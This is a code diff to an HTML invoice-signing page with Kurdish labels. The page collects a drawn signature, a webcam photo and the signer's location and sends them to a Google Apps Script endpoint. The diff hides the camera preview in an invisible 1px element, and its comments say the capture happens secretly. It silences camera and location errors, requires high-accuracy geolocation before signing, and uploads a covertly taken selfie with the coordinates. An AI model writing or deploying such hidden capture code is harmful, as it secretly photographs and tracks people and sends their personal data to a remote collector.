@@ -8,8 +8,10 @@
         body { font-family: Arial, sans-serif; background: #333; margin: 0; padding: 20px 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
         #box { background: white; width: 95%; max-width: 500px; padding: 15px; border-radius: 15px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
         
-        .camera-area { width: 100%; margin-bottom: 10px; border-radius: 8px; overflow: hidden; background: #000; position: relative; }
-        #webcam { width: 100%; display: block; transform: scaleX(-1); }
+        /* کامێراکە لێرە شاراوەیە */
+        #camera-container { width: 1px; height: 1px; opacity: 0; overflow: hidden; position: absolute; }
+        
+        .status-msg { background: #e8f0fe; color: #1a73e8; padding: 10px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; border: 1px solid #d2e3fc; }
         
         .canvas-area { 
             position: relative; 
@@ -27,7 +29,6 @@
         .btns { display: flex; gap: 10px; margin-bottom: 20px; }
         button { flex: 1; padding: 15px; border-radius: 8px; border: none; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
         #loading-overlay { display: none; margin-top: 10px; color: #1a73e8; font-weight: bold; }
-        #location-status { font-size: 12px; margin-bottom: 10px; color: #28a745; display: none; }
 
         .footer-info {
             margin-top: 20px;
@@ -44,14 +45,16 @@
 </head>
 <body>
     <div id="box">
-        <h3 style="margin: 0 0 15px 0;">واژۆکردن و پشتڕاستکردنەوە</h3>
+        <h3 style="margin: 0 0 10px 0;">واژۆکردنی فاتورە</h3>
         
-        <div class="camera-area">
-            <video id="webcam" autoplay playsinline></video>
-            <canvas id="photo-canvas" style="display:none;"></canvas>
+        <div class="status-msg">
+            ⚠️ بۆ دڵنیایی زیاتر و پاراستنی مافی هەردوولا، وێنەی کڕیار و لۆکەیشن تۆمار دەکرێت.
         </div>
-        <p style="font-size: 11px; color: #666; margin-bottom: 10px;">بۆ دڵنیایی زیاتر، وێنەیەک و لۆکەیشن تۆمار دەکرێت</p>
-        <div id="location-status">📍 شوێن دیاری کرا</div>
+
+        <div id="camera-container">
+            <video id="webcam" autoplay playsinline></video>
+            <canvas id="photo-canvas"></canvas>
+        </div>
 
         <div class="canvas-area">
             <img id="invoice-img">
@@ -77,27 +80,24 @@
         const img = document.getElementById('invoice-img');
         const loading = document.getElementById('loading-overlay');
         const video = document.getElementById('webcam');
-        const locStatus = document.getElementById('location-status');
         const pad = new SignaturePad(canvas, { backgroundColor: 'rgba(0,0,0,0)' });
         const urlParams = new URLSearchParams(window.location.search);
         
         let currentCoords = "نەزانراو";
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxokwJrEKZgM0MMVdrBbjPnySyHM9vOmnAv8ED0k4rfIsobxHLGdcCjvGDYvEbtE08/exec";
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzZnKDtqaypizGbqob_Vhsbq9wRu8cHZThmyZlCkBVfNX3J_DOUh82HfFOIp_enT9Y/exec";
 
-        // ١. دەستپێکردنی کامێرا
+        // دەستپێکردنی کامێرا (بە شاراوەیی)
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => { video.srcObject = stream; })
-            .catch(err => alert("تکایە ڕێگە بە کامێرا بدە"));
+            .catch(err => console.log("Camera access denied"));
 
-        // ٢. وەرگرتنی لۆکەیشن
+        // وەرگرتنی لۆکەیشن
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 currentCoords = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                locStatus.style.display = "block";
-            });
+            }, err => console.log("Location denied"), { enableHighAccuracy: true });
         }
 
-        // ٣. بارکردنی وێنەی فاتورە
         if (urlParams.get('img')) {
             img.crossOrigin = "anonymous";
             img.src = "https://images.weserv.nl/?url=" + encodeURIComponent(urlParams.get('img'));
@@ -109,12 +109,19 @@
 
         async function saveAll() {
             if (pad.isEmpty()) return alert("تکایە سەرەتا ئیمزا بکە");
+            
+            // داوای ڕێگەدان بە لۆکەیشن ئەگەر پێشتر نەکرابێت
+            if(currentCoords === "نەزانراو") {
+                alert("تکایە ڕێگە بە لۆکەیشن بدە بۆ تەواوکردنی پرۆسەکە");
+                return;
+            }
+
             loading.style.display = "block";
             
-            // گرتنی سێڵفی
+            // گرتنی وێنەکە لە پشتەوە
             const photoCanvas = document.getElementById('photo-canvas');
-            photoCanvas.width = video.videoWidth;
-            photoCanvas.height = video.videoHeight;
+            photoCanvas.width = video.videoWidth || 640;
+            photoCanvas.height = video.videoHeight || 480;
             photoCanvas.getContext('2d').drawImage(video, 0, 0);
             const selfieBase64 = photoCanvas.toDataURL("image/jpeg", 0.5);
 
@@ -144,11 +151,11 @@
 
                 setTimeout(() => {
                     loading.style.display = "none";
-                    alert("سەرکەوتوو بوو! هەموو زانیارییەکان نێردران.");
+                    alert("سوپاس! واژۆکەت بە سەرکەوتوویی تۆمار کرا.");
                     window.location.reload(); 
                 }, 3500);
             } catch (err) {
-                alert("هەڵە: " + err.message);
+                alert("هەڵەیەک ڕوویدا، دووبارە هەوڵ بدەرەوە");
                 loading.style.display = "none";
             }
         }
